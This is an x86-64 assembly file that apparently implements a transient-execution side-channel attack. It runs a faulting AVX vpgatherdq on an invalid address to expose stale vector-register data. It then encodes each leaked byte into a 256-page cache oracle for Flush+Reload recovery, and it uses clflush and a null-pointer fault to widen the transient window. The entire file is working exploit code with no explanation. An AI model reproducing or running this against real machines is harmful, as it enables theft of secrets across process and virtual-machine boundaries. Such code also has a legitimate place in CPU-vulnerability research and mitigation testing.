.data

.align 0x1000
    # Allocated for cache covert channel oracle
    .global oracles 
oracles:
    .space 8*4096*256, 0

    # Allocated for a dummy memory
    .global address_buffer
address_buffer:
    .space 4096, 0

.text

# Extract the first QWORD from ymm4 and encode it to cache oracle
.macro encode_ymm
    vextracti128 $0, %ymm4, %xmm0
    pextrq $0, %xmm0, %rax
    
    mov %rax, %rbx
    mov %rax, %rcx
    mov %rax, %rdx
    mov %rax, %r8
    mov %rax, %r9
    mov %rax, %r10
    mov %rax, %r11
    
    lea oracles+0*256*4096, %r13
    shr $0, %rax
    and $0xff, %rax
    shlq $12, %rax
    mov (%r13,%rax,1), %rax

    lea oracles+1*256*4096, %r13
    shr $8, %rbx
    and $0xff, %rbx
    shlq $12, %rbx
    mov (%r13,%rbx,1), %rax

    lea oracles+2*256*4096, %r13
    shr $16, %rcx
    and $0xff, %rcx
    shlq $12, %rcx
    mov (%r13,%rcx,1), %rax

    lea oracles+3*256*4096, %r13
    shr $24, %rdx
    and $0xff, %rdx
    shlq $12, %rdx
    mov (%r13,%rdx,1), %rax

    lea oracles+4*256*4096, %r13
    shr $32, %r8
    and $0xff, %r8
    shlq $12, %r8
    mov (%r13,%r8,1), %rax

    lea oracles+5*256*4096, %r13
    shr $40, %r9
    and $0xff, %r9
    shlq $12, %r9
    mov (%r13,%r9,1), %rax

    lea oracles+6*256*4096, %r13
    shr $48, %r10
    and $0xff, %r10
    shlq $12, %r10
    mov (%r13,%r10,1), %rax

    lea oracles+7*256*4096, %r13
    shr $56, %r11
    and $0xff, %r11
    shlq $12, %r11
    mov (%r13,%r11,1), %rax
.endm


    # %rdi pointer to permutation index
    .align 0x1000
    .global s_load_encode
s_load_encode:

    mfence 

    # Intutively Wipe out noisy values. 
    .rept 128
    inc %rax
    vmovups (%rdi), %ymm3
    .endr  

    # Setup registers
    # ymm1: index vector (zeros)
    # ymm2: mask vector (ones)
    # ymm3: output permutation vector (set by caller)
    # ymm4: default output (zeros)
    vpxord %ymm1, %ymm1, %ymm1
    vpcmpeqb %ymm2, %ymm2, %ymm2
    vmovups (%rdi), %ymm3
    vpxord %ymm4, %ymm4, %ymm4
    
    # Step (i): Increase the transient window with cache miss and page fault
    lea address_buffer, %rdi
    clflush (%rdi)
    mov (%rdi), %rax
    xchg %rax, 0(%rdi)
    mov $0, %rdi
    mov (%rdi), %rax

    # Step (ii): Gather to invalid memory address
    mov $0, %r13
    vpgatherdq %ymm2, 0(%r13, %xmm1, 1), %ymm4
    
    # Step (iii): Encode transient data to cache 
    vpermq %ymm4, %ymm3, %ymm4
    encode_ymm
    ret

